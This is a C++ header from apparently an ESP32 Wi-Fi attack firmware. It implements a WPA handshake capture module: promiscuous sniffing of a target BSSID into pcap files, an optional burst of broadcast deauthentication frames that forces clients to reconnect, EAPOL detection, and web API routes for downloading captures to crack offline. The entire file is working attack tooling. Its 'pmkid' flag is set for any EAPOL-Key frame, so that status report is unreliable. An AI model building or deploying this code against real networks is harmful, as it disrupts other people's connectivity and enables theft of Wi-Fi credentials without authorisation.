#pragma once
#include <WiFi.h>
#include <LittleFS.h>
#include <esp_wifi.h>
#include "frames.h"
#include "capture.h"
#include "module.h"
void aegisSniff(void*,wifi_promiscuous_pkt_type_t);
static bool hs_running=false;static uint8_t hs_ch=6,hs_bssid[6]={0};
static volatile bool hs_got_pmkid=false,hs_got_eapol=false;
static uint32_t hs_deauths=0;static TaskHandle_t hs_force=nullptr;
static void hs_sniff(void*buf,wifi_promiscuous_pkt_type_t type){
  if(type!=WIFI_PKT_DATA&&type!=WIFI_PKT_MGMT)return;
  const wifi_promiscuous_pkt_t*p=(const wifi_promiscuous_pkt_t*)buf;
  const uint8_t*pl=p->payload;int len=p->rx_ctrl.sig_len;
  pcapWrite(pl,len);
  // Only parse DATA frames (type=2, bits 2-3 of fc[0] == 0x08)
  if((pl[0]&0x0C)!=0x08) return;
  // Compute header offset
  int off = 24;
  if((pl[1]&0x03)==0x03) off += 6;         // ToDS + FromDS -> addr4 (WDS)
  if(((pl[0]&0xF0)>>4)>=8) off += 2;       // QoS subtype
  if(off+11 > len) return;
  // LLC/SNAP check for EAPOL (AA AA 03 00 00 00 88 8E)
  if(pl[off]!=0xAA||pl[off+1]!=0xAA||pl[off+6]!=0x88||pl[off+7]!=0x8E) return;
  hs_got_eapol = true;
  // EAPOL header: version(1) type(1) length(2). Type 3 = EAPOL-Key (M1..M4)
  if(pl[off+8]==1 && pl[off+9]==3) hs_got_pmkid = true;
}

static void hs_force_run(void*){
  uint8_t f[64];
  for(int i=0;i<20&&hs_running;i++){size_t n=f_deauth(f,BC,hs_bssid,7);esp_wifi_80211_tx(WIFI_IF_AP,f,n,false);hs_deauths++;vTaskDelay(pdMS_TO_TICKS(200));}
  hs_force=nullptr;vTaskDelete(nullptr);
}
static bool hs_start(const String&q){
  String bs,ch;int i;
  if((i=q.indexOf("bssid="))>=0){int e=q.indexOf('&',i);bs=q.substring(i+6,e<0?q.length():e);}
  if((i=q.indexOf("ch="))>=0){int e=q.indexOf('&',i);ch=q.substring(i+3,e<0?q.length():e);}
  if(bs.length()==17)sscanf(bs.c_str(),"%x:%x:%x:%x:%x:%x",(unsigned*)&hs_bssid[0],(unsigned*)&hs_bssid[1],(unsigned*)&hs_bssid[2],(unsigned*)&hs_bssid[3],(unsigned*)&hs_bssid[4],(unsigned*)&hs_bssid[5]);
  hs_ch=ch.toInt();if(!hs_ch)hs_ch=6;
  esp_wifi_set_channel(hs_ch,WIFI_SECOND_CHAN_NONE);
  pcapOpen("hs");
  wifi_promiscuous_filter_t f={};f.filter_mask=WIFI_PROMIS_FILTER_MASK_DATA|WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&f);esp_wifi_set_promiscuous_rx_cb(hs_sniff);esp_wifi_set_promiscuous(true);
  hs_running=true;hs_got_pmkid=false;hs_got_eapol=false;hs_deauths=0;
  if(q.indexOf("force=1")>=0)xTaskCreate(hs_force_run,"hsforce",2048,nullptr,4,&hs_force);
  return true;
}
static void hs_stop(){hs_running=false;pcapClose();esp_wifi_set_promiscuous_rx_cb(aegisSniff);wifi_promiscuous_filter_t f={};f.filter_mask=WIFI_PROMIS_FILTER_MASK_MGMT|WIFI_PROMIS_FILTER_MASK_DATA;esp_wifi_set_promiscuous_filter(&f);esp_wifi_set_promiscuous(true);}
static void hs_routes(){extern WebServer server;
  server.on("/api/handshake/start",HTTP_POST,[](){String q;for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}bool ok=tool_start("handshake",q);server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");});
  server.on("/api/handshake/stop",HTTP_POST,[](){tool_stop("handshake");server.send(200,"application/json","{\"ok\":1}");});
  server.on("/api/handshake/status",HTTP_GET,[](){server.send(200,"application/json","{\"running\":"+String(hs_running?1:0)+",\"eapol\":"+String(hs_got_eapol?1:0)+",\"pmkid\":"+String(hs_got_pmkid?1:0)+",\"bytes\":"+String(g_pcapBytes)+",\"msg\":\""+String(hs_got_eapol?"EAPOL captured":"waiting")+"\"}");});
  server.on("/api/handshake/pcap",HTTP_GET,[](){
    if(!g_pcapName[0]||!LittleFS.exists(g_pcapName)){server.send(404,"application/json","{\"ok\":0,\"err\":\"no capture\"}");return;}
    File f=LittleFS.open(g_pcapName,"r");if(!f){server.send(500,"application/json","{\"ok\":0}");return;}
    server.sendHeader("Content-Disposition","attachment; filename=capture.pcap");
    server.streamFile(f,"application/octet-stream");f.close();});
  server.on("/api/handshake/list",HTTP_GET,[](){
    String j="[";bool first=true;
    File root=LittleFS.open("/","r");File entry=root.openNextFile();
    while(entry){if(!entry.isDirectory()){String n=entry.name();if(n.endsWith(".pcap")){if(!first)j+=",";first=false;j+="{\"name\":\""+n+"\",\"size\":"+String(entry.size())+"}";}}entry=root.openNextFile();}
    j+="]";server.send(200,"application/json",j);});}
